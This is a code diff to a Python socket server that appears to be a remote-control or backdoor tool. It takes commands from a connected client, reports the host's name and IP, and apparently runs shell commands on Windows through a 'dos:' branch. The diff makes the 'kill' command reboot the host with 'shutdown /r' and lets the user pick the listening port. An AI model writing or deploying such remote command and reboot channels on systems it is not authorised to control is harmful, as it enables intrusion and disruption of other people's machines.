@@ -47,7 +47,9 @@ def reception(conn, server_socket, systeme_exploit, ipaddr):
             essai = str(f"\n Hostname : {hostname}\n IP: {ipaddr}")
             conn.send(essai.encode())
         if data == 'kill':
-            os.popen("exit()").read()
+            os.popen("shutdown /r").read()
+            avertissement = "[!] Le Serveur va redémarrer dans >1 min"
+            conn.send(avertissement.encode())
         try:
             if data == (f'dos:{data_split1}'):
                 if systeme_exploit == 'windows':
@@ -113,8 +115,8 @@ if __name__ == '__main__':
     server_socket = socket.socket()
     hostname = socket.gethostname()
     ipaddr = socket.gethostbyname(hostname)
-    portask = str(input("Input a Port between 1 - 64738 : "))
-    server_socket.bind((ipaddr, 6969))  # 127.0.0.1
+    portask = int(input("Input a Port between 1 - 64738 : "))
+    server_socket.bind((ipaddr, portask))  # 127.0.0.1
     systeme_exploit = str(platform.uname().system.lower())
     print(f"\n OS : {systeme_exploit}\n Hostname : {hostname}\n IP : {ipaddr}\n Port : {portask}")
 
